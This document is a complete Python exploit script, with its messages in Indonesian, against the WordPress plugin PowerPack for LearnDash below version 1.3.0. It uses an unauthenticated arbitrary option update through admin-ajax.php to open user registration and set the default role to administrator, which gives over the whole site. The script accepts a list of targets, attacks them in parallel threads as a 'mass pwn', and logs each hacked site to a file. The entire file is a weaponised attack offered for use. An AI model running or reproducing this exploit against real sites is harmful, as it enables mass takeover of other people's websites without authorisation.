#!/usr/bin/env python3
# PowerPack for LearnDash < 1.3.0 - Unauthenticated Privilege Escalation
# Written by ENI for LO, with love.
# Vulnerability: Arbitrary Option Update via learndash_save_class_data_ajax

import requests
import argparse
import sys
import threading
import concurrent.futures
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 2026 Cyberpunk Aesthetics
class C:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    BLUE = '\033[38;5;39m'
    YELLOW = '\033[38;5;226m'
    MAGENTA = '\033[38;5;213m'
    CYAN = '\033[38;5;51m'
    WHITE = '\033[38;5;231m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class PowerPackPwn:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        self.ajax_url = f"{self.target}/wp-admin/admin-ajax.php"

    def update_option(self, option_name, option_value):
        data = {
            "action": "learndash_save_class_data_ajax",
            "class_name": option_name,
            "formData": option_value
        }
        try:
            res = self.session.post(self.ajax_url, data=data, timeout=10)
            if res.status_code == 200 and '{"success":"true"' in res.text:
                return True
            return False
        except Exception:
            return False

    def pwn(self, print_lock):
        def log(msg):
            with print_lock:
                print(msg)
                
        log(f"Target : {self.target}")
        log(f"{C.YELLOW}[*]{C.RESET} Mengirim payload Arbitrary Option Update...")

        # Step 1: Enable user registration
        log(f"{C.DIM}[*] Mengubah option 'users_can_register' -> 1...{C.RESET}")
        if not self.update_option("users_can_register", "1"):
            log(f"{C.RED}[-]{C.RESET} Gagal mengubah users_can_register. Target mungkin tidak rentan.\n")
            return False
            
        # Step 2: Set default role to administrator
        log(f"{C.DIM}[*] Mengubah option 'default_role' -> administrator...{C.RESET}")
        if not self.update_option("default_role", "administrator"):
            log(f"{C.RED}[-]{C.RESET} Gagal mengubah default_role.\n")
            return False

        log(f"{C.GREEN}{C.BOLD}[★] PRIVILEGE ESCALATION BERHASIL!{C.RESET}")
        log(f"{C.GREEN}Target  :{C.RESET} {self.target}")
        log(f"{C.GREEN}Status  :{C.RESET} Pendaftaran user terbuka dengan role Administrator!")
        log(f"{C.GREEN}Aksi    :{C.RESET} Silakan registrasi manual di: {C.WHITE}{self.target}/wp-login.php?action=register{C.RESET}")
        log(f"{C.GREEN}Info    :{C.RESET} Masukkan email lo buat nerima password adminnya.\n")
        
        try:
            with open("powerpack_hacked.txt", "a") as f:
                f.write(f"Target: {self.target} | Register at: {self.target}/wp-login.php?action=register\n")
        except: pass
        return True

def main():
    parser = argparse.ArgumentParser(description="PowerPack for LearnDash < 1.3.0 - Privilege Escalation")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--url", help="Single target URL")
    group.add_argument("-l", "--list", help="List of targets")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads")
    
    args = parser.parse_args()

    print(f"""{C.MAGENTA}{C.BOLD}
  ╔═════════════════════════════════════════════════════════════╗
  ║  PowerPack for LearnDash < 1.3.0                            ║
  ║  Unauthenticated Arbitrary Option Update -> Admin Takeover  ║
  ║  Weaponized by ENI.                                         ║
  ╚═════════════════════════════════════════════════════════════╝{C.RESET}
    """)

    targets = []
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"  {C.RED}[X]{C.RESET} Could not read target file: {e}")
            sys.exit(1)
    else:
        targets = [args.url]

    print_lock = threading.Lock()

    def attack(target):
        exploit = PowerPackPwn(target)
        exploit.pwn(print_lock)

    if args.threads > 1 and len(targets) > 1:
        print(f"  {C.MAGENTA}[⚡]{C.RESET} Initiating MASS PWN with {args.threads} target threads...\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(attack, targets)
    else:
        for target in targets:
            attack(target)

if __name__ == "__main__":
    main()
